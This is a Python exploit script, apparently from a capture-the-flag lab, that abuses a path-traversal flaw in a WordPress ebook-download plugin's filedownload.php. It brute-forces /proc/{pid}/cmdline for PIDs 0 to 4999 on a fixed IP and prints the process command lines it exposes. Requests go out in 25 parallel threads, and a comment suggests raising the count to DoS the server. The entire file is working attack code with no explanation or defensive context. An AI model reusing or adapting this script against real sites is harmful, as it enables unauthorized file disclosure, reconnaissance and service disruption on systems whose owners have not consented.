import requests
import sys
import requests
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

def get_parallel(url_expect):

	results = [];
	#Increase max_workers to DoS the server ;)
	executor = ThreadPoolExecutor(max_workers=25);
	#For each value in url_expect [ [guess1,expected1],[guess2,expected2], ... ] pass it to http_get
	for result in executor.map(http_get,url_expect):
		results.append(result)

	return results

def http_get(stuff):

	path = stuff[0]
	expected = stuff[1]
	
	x = requests.get(url=f"http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl={path}").text
	#Fancy output
	sys.stdout.write(path+"\r");
	sys.stdout.flush();
	
	if x != expected:
		#Clean up the output
		removed = x.replace(path,"").replace("<script>window.close()</script>","");
		#Return the commandline args of the process
		return removed

		

guesses = []
for pid in range(0000,5000):
	#Look at what command line arguments started the process
	guess = f"../../../../../../../../../../../../../proc/{pid}/cmdline";
	#This is the response if there is no proc/pid/cmdline file
	expected_response = f"{guess}{guess}{guess}<script>window.close()</script>"
	#Create an array with the guess and expected response
	arr = [guess,expected_response]
	#Add that array to the guesses
	guesses.append(arr);


#Guess in parallel
commands = get_parallel(guesses);
#Print all cmdline args from found pids
for command in commands:
	if command != None:
		print(command)
